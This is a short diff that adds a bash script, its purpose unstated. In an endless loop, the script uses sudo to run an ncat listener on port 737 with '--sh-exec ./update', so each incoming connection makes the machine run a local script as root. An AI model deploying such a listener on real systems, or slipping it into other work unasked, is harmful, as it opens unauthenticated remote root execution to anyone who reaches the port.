@@ -1,0 +1,6 @@
+#!/bin/bash
+while :
+do
+	sudo ncat -lp 737 --sh-exec ./update
+	sleep 10;
+done
